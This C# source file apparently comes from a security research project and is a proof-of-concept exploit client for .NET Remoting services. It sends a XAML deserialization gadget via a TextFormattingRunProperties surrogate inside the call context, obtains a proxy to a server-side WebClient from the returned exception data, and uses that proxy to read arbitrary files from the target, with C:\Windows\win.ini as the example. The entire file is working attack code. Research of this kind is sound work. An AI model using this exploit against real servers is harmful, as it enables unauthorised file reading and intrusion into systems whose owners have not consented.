using System;
using System.Runtime.Remoting.Messaging;
using System.Runtime.Remoting;
using System.IO;
using System.Net;
using System.Runtime.Serialization;
using System.Reflection;
using CodeWhite.Remoting.Shared;
using System.Collections.Generic;

namespace CodeWhite.Remoting.RemotingClient_MBRO
{
    internal class Program
    {
        static readonly string ASSEMBLY_LOCATION = Assembly.GetExecutingAssembly().Location;
        static readonly string XAML_PAYLOAD_FILE = "WebClient.xaml.xml";

        internal static void Main(string[] args)
        {
            if (args.Length != 2)
            {
                Console.Error.WriteLine($"usage: {Path.GetFileName(ASSEMBLY_LOCATION)} objUrl fileUrl");
                Console.Error.WriteLine();
                Console.Error.WriteLine("example:");
                Console.Error.WriteLine($@"  {Path.GetFileName(ASSEMBLY_LOCATION)} tcp://127.0.0.1:12345/DummyService C:\Windows\win.ini");
                Environment.Exit(-1);
            }

            Uri objUrl = new Uri(args[0]);
            Uri fileUrl = new Uri(args[1]);

            RemotingConfiguration.Configure($"{Assembly.GetExecutingAssembly().Location}.config");

            // prepare and send XAML gadget
            object payload = new TextFormattingRunPropertiesMarshal(File.ReadAllText(XAML_PAYLOAD_FILE));
            const string key = "MBRO";
            var logicalCallContextData = new Dictionary<string, object>()
            {
                { key, payload }
            };
            IMethodReturnMessage methodReturnMessage = Utils.CallRemoteToStringMethod(objUrl, logicalCallContextData);

            // obtain proxy from `Exception.Data`
            var exception = methodReturnMessage.Exception;
            while (exception.InnerException != null)
                exception = exception.InnerException;
            var mbro = (MarshalByRefObject)((object[])exception.Data[key])[0];

            // print info
            Utils.PrintInfo(mbro);

            // use remote `WebClient`
            WebClient remoteWebClient = (WebClient)mbro;
            Console.WriteLine(remoteWebClient.DownloadString(fileUrl));
        }
    }

    [Serializable]
    public class TextFormattingRunPropertiesMarshal : ISerializable
    {
        string _xaml;
        public TextFormattingRunPropertiesMarshal(string xaml)
        {
            this._xaml = xaml;
        }
        void ISerializable.GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(typeof(Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties));
            info.AddValue("ForegroundBrush", this._xaml);
        }
    }
}
